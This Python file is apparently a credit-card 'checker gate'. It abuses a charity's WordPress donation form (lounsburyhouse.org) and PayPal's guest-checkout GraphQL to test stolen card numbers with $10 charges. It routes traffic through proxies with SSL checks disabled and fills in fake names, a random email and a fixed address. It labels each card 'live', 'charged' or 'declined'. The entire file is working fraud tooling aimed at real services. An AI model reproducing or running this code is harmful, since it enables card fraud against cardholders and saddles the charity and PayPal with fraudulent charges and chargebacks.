import aiohttp
from aiohttp_socks import ProxyConnector
import json
import re
import random
import string
import asyncio

def _generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    return f"{name}@{random.choice(domains)}"

def _detect_card_brand(cc):
    if cc.startswith('4'): return 'VISA'
    if cc[:2] in ('51', '52', '53', '54', '55') or (2221 <= int(cc[:4]) <= 2720 if len(cc) >= 4 and cc[:4].isdigit() else False): return 'MASTER_CARD'
    if cc[:2] in ('34', '37'): return 'AMEX'
    if cc[:2] in ('60', '65'): return 'DISCOVER'
    return 'VISA'

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    formatted = None
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        formatted = ps
    else:
        parts = ps.split(":")
        if len(parts) == 4:
            if parts[1].isdigit(): formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif parts[3].isdigit(): formatted = f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
            else: formatted = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2: formatted = f"http://{parts[0]}:{parts[1]}"
        else: formatted = f"http://{ps}"

    if formatted.startswith("socks5://"):
        formatted = formatted.replace("socks5://", "socks5h://")
    elif formatted.startswith("socks4://"):
        formatted = formatted.replace("socks4://", "socks4a://")

    return formatted

async def check_card_paypal_lounsbury(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[str, str, str]:
    """
    PayPal Commerce $10.00 Gate (lounsburyhouse.org).
    Returns: (status, message, brand)
    """
    if len(yy) == 2:
        yy = f"20{yy}"
    mm = mm.zfill(2)

    formatted_proxy = _format_proxy(proxy_url)
    brand = _detect_card_brand(cc)
    email = _generate_email()
    first_name = "Martin"
    last_name = "Mark"

    headers_base = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    try:
        if formatted_proxy:
            connector = ProxyConnector.from_url(formatted_proxy, ssl=False)
        else:
            connector = aiohttp.TCPConnector(ssl=False)

        timeout = aiohttp.ClientTimeout(total=25, connect=8)
        async with aiohttp.ClientSession(connector=connector, headers=headers_base, timeout=timeout) as session:
            # Step 1: GET page for nonces
            async with session.get('https://lounsburyhouse.org/donate/') as r_page:
                html = await r_page.text()

            nonce_match = re.search(r'"create_subscription":"([^"]+)"', html)
            if not nonce_match:
                return "error", "Failed to extract PayPal subscription nonce", "N/A"
            nonce_sub = nonce_match.group(1)

            # Step 2: Create subscription via wp-admin/admin-ajax.php
            form_data = aiohttp.FormData()
            form_data.add_field('wpforms[fields][4]', '')
            form_data.add_field('wpforms[fields][6]', '')
            form_data.add_field('wpforms[fields][1][first]', first_name)
            form_data.add_field('wpforms[fields][1][last]', last_name)
            form_data.add_field('wpforms[fields][3]', email)
            form_data.add_field('wpforms[fields][2]', '10.00')
            form_data.add_field('wpforms[fields][5]', '')
            form_data.add_field('wpforms[fields][11][orderID]', '')
            form_data.add_field('wpforms[fields][11][subscriptionID]', '')
            form_data.add_field('wpforms[fields][11][source]', '')
            form_data.add_field('wpforms[fields][11][cardname]', '')
            form_data.add_field('wpforms[recaptcha]', '')
            form_data.add_field('wpforms[id]', '464')
            form_data.add_field('page_title', 'DONATE')
            form_data.add_field('page_url', 'https://lounsburyhouse.org/donate/')
            form_data.add_field('url_referer', '')
            form_data.add_field('page_id', '332')
            form_data.add_field('wpforms[post_id]', '332')
            form_data.add_field('total', '10')
            form_data.add_field('planId', '')
            form_data.add_field('nonce', nonce_sub)

            headers_wp = {
                'Origin': 'https://lounsburyhouse.org',
                'Referer': 'https://lounsburyhouse.org/donate/',
            }
            async with session.post(
                'https://lounsburyhouse.org/wp-admin/admin-ajax.php?action=wpforms_paypal_commerce_create_subscription',
                headers=headers_wp,
                data=form_data
            ) as r_sub:
                try:
                    sub_json = await r_sub.json()
                    id_token_cart = sub_json.get('data', {}).get('id')
                except Exception:
                    sub_text = await r_sub.text()
                    match_id = re.search(r'"id":"([^"]+)"', sub_text)
                    id_token_cart = match_id.group(1) if match_id else None

            if not id_token_cart:
                return "declined", "Subscription Initialization Failed", brand

            # Step 3: Get Cart Token from PayPal
            headers_pp = {
                'Accept': 'application/json',
                'X-Requested-By': 'smart-payment-buttons',
                'Origin': 'https://www.paypal.com',
            }
            async with session.post(
                f'https://www.paypal.com/smart/api/billagmt/subscriptions/{id_token_cart}/cartid',
                headers=headers_pp
            ) as r_cart:
                try:
                    cart_json = await r_cart.json()
                    token_checkout = (cart_json.get('data') or {}).get('token') or cart_json.get('token')
                except Exception:
                    cart_text = await r_cart.text()
                    match_tok = re.search(r'"token":"([^"]+)"', cart_text)
                    token_checkout = match_tok.group(1) if match_tok else None

            if not token_checkout:
                return "error", "Failed to retrieve PayPal checkout token", brand

            # Step 4: Onboard Guest & Pay via PayPal GraphQL
            headers_gql = {
                'Content-Type': 'application/json',
                'Paypal-Client-Context': token_checkout,
                'X-App-Name': 'checkoutuinodeweb_weasley',
                'Origin': 'https://www.paypal.com',
                'X-Country': 'US',
            }

            graphql_payload = {
                'operationName': 'OnboardGuestMutation',
                'variables': {
                    'card': {
                        'cardNumber': cc,
                        'expirationDate': f"{mm}/{yy}",
                        'securityCode': cvc,
                        'type': brand,
                    },
                    'country': 'US',
                    'email': email,
                    'firstName': first_name,
                    'lastName': last_name,
                    'phone': {'countryCode': '1', 'number': '5159662869', 'type': 'MOBILE'},
                    'token': token_checkout,
                    'billingAddress': {
                        'line1': '8872 SE Vandalia Dr',
                        'city': 'Runnells',
                        'state': 'IA',
                        'postalCode': '50237',
                        'country': 'US',
                        'familyName': last_name,
                        'givenName': first_name,
                    },
                    'shippingAddress': {
                        'line1': '',
                        'city': '',
                        'state': '',
                        'postalCode': '',
                        'accountQuality': {
                            'autoCompleteType': 'MANUAL',
                            'isUserModified': False,
                        },
                        'country': 'US',
                        'familyName': first_name,
                        'givenName': last_name,
                    },
                    'crsData': None,
                },
                'query': '''mutation OnboardGuestMutation($bank: BankAccountInput, $billingAddress: AddressInput, $card: CardInput, $country: CountryCodes, $currencyConversionType: CheckoutCurrencyConversionType, $dateOfBirth: DateOfBirth, $email: String, $firstName: String!, $lastName: String!, $phone: PhoneInput, $shareAddressWithDonatee: Boolean, $shippingAddress: AddressInput, $token: String!) {
  onboardAccount: onboardGuest(
    bank: $bank
    billingAddress: $billingAddress
    card: $card
    country: $country
    currencyConversionType: $currencyConversionType
    dateOfBirth: $dateOfBirth
    email: $email
    firstName: $firstName
    lastName: $lastName
    phone: $phone
    shareAddressWithDonatee: $shareAddressWithDonatee
    shippingAddress: $shippingAddress
    token: $token
  ) {
    buyer {
      auth {
        accessToken
        __typename
      }
      userId
      __typename
    }
    flags {
      is3DSecureRequired
      __typename
    }
  }
}'''
            }

            async with session.post('https://www.paypal.com/graphql?OnboardGuestMutation', headers=headers_gql, json=graphql_payload) as r_gql:
                try:
                    gql_data = await r_gql.json()
                except Exception:
                    gql_data = {}
                res_text = json.dumps(gql_data)

            errors = gql_data.get('errors', [])
            data_obj = gql_data.get('data') or {}
            onboard_acc = data_obj.get('onboardAccount')

            if onboard_acc and isinstance(onboard_acc, dict):
                buyer = onboard_acc.get('buyer') or {}
                auth = buyer.get('auth') or {}
                flags = onboard_acc.get('flags') or {}
                if flags.get('is3DSecureRequired'):
                    return "live", "3D Secure Required (Card Live)", brand
                if auth.get('accessToken') and not errors:
                    return "charged", "Charge Successful ($10.00)", brand

            # Parse Errors & Declined States
            res_upper = res_text.upper()
            if "INSUFFICIENT_FUNDS" in res_upper or "INSUFFICIENT" in res_upper:
                return "live", "Insufficient Funds", brand
            elif "INVALID_SECURITY_CODE" in res_upper or "CVV" in res_upper or "CVC" in res_upper:
                return "live", "Security code is incorrect (CCN Live)", brand
            elif "GUEST_CARD_COUNTRY_MISMATCH" in res_upper:
                return "live", "Card Approved (Country Mismatch)", brand
            elif "IS3DSECUREREQUIRED" in res_upper and "TRUE" in res_upper:
                return "live", "3D Secure Required", brand
            elif "CARD_GENERIC_ERROR" in res_upper or "ISSUER_DECLINE" in res_upper or "DO_NOT_HONOR" in res_upper:
                return "declined", "Card Declined by Issuer", brand
            else:
                if errors and isinstance(errors, list):
                    err_msg = errors[0].get('message') or errors[0].get('errorData', {}).get('0', {}).get('code') or "Card Declined"
                    return "declined", f"Declined - {err_msg}", brand
                return "declined", "Payment declined.", brand

    except (aiohttp.ClientProxyConnectionError, aiohttp.ClientHttpProxyError):
        return "error", "Proxy connection failed (Dead or invalid proxy)", "N/A"
    except aiohttp.ClientConnectionError:
        return "error", "Network connection failed", "N/A"
    except asyncio.TimeoutError:
        return "error", "Connection timed out", "N/A"
    except Exception as e:
        err_str = str(e)
        if "502" in err_str or "Bad Gateway" in err_str or "ProxyError" in err_str:
            return "error", "Proxy connection failed (502 Bad Gateway)", "N/A"
        return "error", f"Error: {err_str[:60]}", "N/A"

